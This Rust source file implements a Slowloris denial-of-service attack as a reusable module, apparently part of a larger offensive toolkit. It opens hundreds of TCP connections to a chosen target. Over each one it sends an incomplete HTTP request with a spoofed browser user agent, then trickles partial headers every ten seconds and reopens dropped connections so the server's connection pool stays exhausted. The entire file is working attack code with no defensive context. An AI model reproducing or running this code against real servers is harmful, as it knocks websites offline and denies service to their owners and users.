use std::collections::HashMap;
use std::io::Write;
use std::net::TcpStream;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use rand::Rng;

const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
];

pub struct Slowloris {
    target: String,
    duration: u64,
    threads: u32,
    port: u16,
    stop_flag: Arc<AtomicBool>,
    connections_opened: Arc<AtomicU64>,
    connections_active: Arc<AtomicU64>,
    callback: Arc<dyn Fn(&str) + Send + Sync>,
}

impl Slowloris {
    pub fn new(
        target: String,
        duration: u64,
        threads: u32,
        port: u16,
        callback: Arc<dyn Fn(&str) + Send + Sync>,
    ) -> Self {
        Self {
            target,
            duration,
            threads,
            port,
            stop_flag: Arc::new(AtomicBool::new(false)),
            connections_opened: Arc::new(AtomicU64::new(0)),
            connections_active: Arc::new(AtomicU64::new(0)),
            callback,
        }
    }

    pub fn stop(&self) {
        self.stop_flag.store(true, Ordering::SeqCst);
    }

    pub fn run(&self) -> HashMap<String, String> {
        let addr = format!("{}:{}", self.target, self.port);

        (self.callback)(&format!(
            "[*] Launching Slowloris on {} with {} sockets for {}s",
            addr, self.threads, self.duration
        ));

        let start = Instant::now();
        let dur = Duration::from_secs(self.duration);

        // Shared pool of live connections
        let sockets: Arc<Mutex<Vec<TcpStream>>> = Arc::new(Mutex::new(Vec::new()));

        // Phase 1: Open initial connections
        (self.callback)("[*] Opening initial connections...");
        self.open_connections(&addr, &sockets);

        // Phase 2: Keep-alive loop - send partial headers every ~10 seconds
        let stop = self.stop_flag.clone();
        let active = self.connections_active.clone();
        let opened = self.connections_opened.clone();
        let socks = sockets.clone();
        let cb = self.callback.clone();
        let target_addr = addr.clone();
        let num_threads = self.threads;

        let keepalive_handle = std::thread::spawn(move || {
            let mut rng = rand::thread_rng();
            while !stop.load(Ordering::Relaxed) && start.elapsed() < dur {
                // Send keep-alive header on each socket
                {
                    let mut pool = socks.lock().unwrap();
                    let mut alive = Vec::new();
                    for mut sock in pool.drain(..) {
                        let val: u32 = rng.gen_range(1..10000);
                        let header = format!("X-a: {}\r\n", val);
                        if sock.write_all(header.as_bytes()).is_ok() {
                            alive.push(sock);
                        }
                    }
                    let count = alive.len() as u64;
                    active.store(count, Ordering::Relaxed);
                    *pool = alive;
                }

                // Try to re-open dead connections back to target count
                {
                    let current = {
                        let pool = socks.lock().unwrap();
                        pool.len() as u32
                    };
                    if current < num_threads {
                        let to_open = num_threads - current;
                        for _ in 0..to_open {
                            if stop.load(Ordering::Relaxed) || start.elapsed() >= dur {
                                break;
                            }
                            if let Ok(mut stream) =
                                TcpStream::connect_timeout(
                                    &target_addr.parse().unwrap(),
                                    Duration::from_secs(4),
                                )
                            {
                                let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
                                let _ = stream.set_write_timeout(Some(Duration::from_secs(10)));
                                let ua = USER_AGENTS[rng.gen_range(0..USER_AGENTS.len())];
                                let request = format!(
                                    "GET /?{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept-Language: en-US,en;q=0.5\r\n",
                                    rng.gen_range(0..2000),
                                    target_addr,
                                    ua
                                );
                                if stream.write_all(request.as_bytes()).is_ok() {
                                    opened.fetch_add(1, Ordering::Relaxed);
                                    let mut pool = socks.lock().unwrap();
                                    pool.push(stream);
                                }
                            }
                        }
                        let new_count = {
                            let pool = socks.lock().unwrap();
                            pool.len() as u64
                        };
                        active.store(new_count, Ordering::Relaxed);
                    }
                }

                let elapsed = start.elapsed().as_secs();
                let a = active.load(Ordering::Relaxed);
                let o = opened.load(Ordering::Relaxed);
                cb(&format!(
                    "[STATS] Active: {} | Total opened: {} | Elapsed: {}s",
                    a, o, elapsed
                ));

                // Sleep ~10 seconds (check stop flag every second)
                for _ in 0..10 {
                    if stop.load(Ordering::Relaxed) || start.elapsed() >= dur {
                        break;
                    }
                    std::thread::sleep(Duration::from_secs(1));
                }
            }
        });

        let _ = keepalive_handle.join();
        self.stop_flag.store(true, Ordering::SeqCst);

        // Close all remaining sockets
        {
            let mut pool = sockets.lock().unwrap();
            pool.clear();
        }

        let total_opened = self.connections_opened.load(Ordering::Relaxed);
        let final_active = self.connections_active.load(Ordering::Relaxed);
        let elapsed = start.elapsed().as_secs_f64();

        let mut stats = HashMap::new();
        stats.insert("connections_opened".into(), total_opened.to_string());
        stats.insert("connections_active".into(), final_active.to_string());
        stats.insert("duration".into(), format!("{:.1}s", elapsed));
        stats
    }

    fn open_connections(&self, addr: &str, sockets: &Arc<Mutex<Vec<TcpStream>>>) {
        let mut rng = rand::thread_rng();
        let parsed_addr: std::net::SocketAddr = addr.parse().unwrap();

        for i in 0..self.threads {
            if self.stop_flag.load(Ordering::Relaxed) {
                break;
            }
            match TcpStream::connect_timeout(&parsed_addr, Duration::from_secs(4)) {
                Ok(mut stream) => {
                    let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
                    let _ = stream.set_write_timeout(Some(Duration::from_secs(10)));

                    let ua = USER_AGENTS[rng.gen_range(0..USER_AGENTS.len())];
                    let request = format!(
                        "GET /?{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nAccept-Language: en-US,en;q=0.5\r\n",
                        rng.gen_range(0..2000),
                        addr,
                        ua
                    );
                    if stream.write_all(request.as_bytes()).is_ok() {
                        self.connections_opened.fetch_add(1, Ordering::Relaxed);
                        let mut pool = sockets.lock().unwrap();
                        pool.push(stream);
                    }
                }
                Err(_) => {
                    // Connection failed, continue
                }
            }

            if (i + 1) % 50 == 0 {
                (self.callback)(&format!("[*] Opened {} connections...", i + 1));
            }
        }

        let count = {
            let pool = sockets.lock().unwrap();
            pool.len() as u64
        };
        self.connections_active.store(count, Ordering::Relaxed);
        (self.callback)(&format!(
            "[*] Initial connections established: {}",
            count
        ));
    }
}
